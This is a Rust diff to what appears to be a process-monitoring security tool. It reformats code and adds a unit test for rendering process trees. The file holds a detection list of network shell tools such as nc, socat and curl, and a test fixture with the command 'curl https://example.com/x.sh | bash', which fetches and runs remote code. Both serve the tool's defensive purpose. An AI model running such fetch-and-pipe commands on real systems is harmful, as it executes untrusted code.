@@ -110,7 +110,11 @@ fn format_process_tree_lines(process: &ProcessInfo) -> Vec<String> {
                 line
             } else {
                 let indent = "  ".repeat(idx - 1);
-                let branch = if idx == leaf_index { "└─ " } else { "├─ " };
+                let branch = if idx == leaf_index {
+                    "└─ "
+                } else {
+                    "├─ "
+                };
                 format!("{indent}{branch}{line}")
             }
         })
@@ -166,9 +170,11 @@ fn is_suspicious_command(name: &str, cmdline: &str) -> bool {
 
 fn is_suspicious_name(name: &str) -> bool {
     let lower = name.to_ascii_lowercase();
-    ["nc", "ncat", "netcat", "socat", "bash", "sh", "curl", "wget"]
-        .iter()
-        .any(|needle| lower == *needle || lower.contains(needle))
+    [
+        "nc", "ncat", "netcat", "socat", "bash", "sh", "curl", "wget",
+    ]
+    .iter()
+    .any(|needle| lower == *needle || lower.contains(needle))
 }
 
 fn is_suspicious_cmdline(cmdline: &str) -> bool {
@@ -199,11 +205,7 @@ fn extract_args(cmdline: &str) -> Option<String> {
     let mut parts = trimmed.split_whitespace();
     let _ = parts.next()?;
     let args = parts.collect::<Vec<_>>().join(" ");
-    if args.is_empty() {
-        None
-    } else {
-        Some(args)
-    }
+    if args.is_empty() { None } else { Some(args) }
 }
 
 fn truncate(value: &str, max_len: usize) -> String {
@@ -217,5 +219,60 @@ fn truncate(value: &str, max_len: usize) -> String {
                 .take(max_len.saturating_sub(3))
                 .collect::<String>()
         )
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::format_process_tree_lines;
+    use crate::models::ProcessInfo;
+
+    fn strip_ansi(input: &str) -> String {
+        let mut out = String::new();
+        let mut chars = input.chars().peekable();
+
+        while let Some(ch) = chars.next() {
+            if ch == '\u{1b}' {
+                if matches!(chars.peek(), Some('[')) {
+                    let _ = chars.next();
+                    for c in chars.by_ref() {
+                        if c == 'm' {
+                            break;
+                        }
+                    }
+                }
+                continue;
+            }
+            out.push(ch);
+        }
+        out
+    }
+
+    #[test]
+    fn tree_rendering_produces_expected_unicode_output() {
+        let process = ProcessInfo {
+            pid: 300,
+            ppid: 200,
+            name: "curl".to_string(),
+            cmdline: "curl https://example.com/x.sh | bash".to_string(),
+            exe: "/usr/bin/curl".to_string(),
+            cwd: "/tmp".to_string(),
+            username: "user".to_string(),
+            open_files: Vec::new(),
+            parent_chain: vec!["bash(200)".to_string(), "tmux(100)".to_string()],
+        };
+
+        let rendered = format_process_tree_lines(&process)
+            .into_iter()
+            .map(|line| strip_ansi(&line))
+            .collect::<Vec<_>>();
+
+        assert_eq!(rendered.len(), 3);
+        assert_eq!(rendered[0], "tmux (pid:100)");
+        assert_eq!(rendered[1], "├─ bash (pid:200)");
+        assert_eq!(
+            rendered[2],
+            "  └─ curl (pid:300) args: https://example.com/x.sh | bash"
+        );
     }
 }
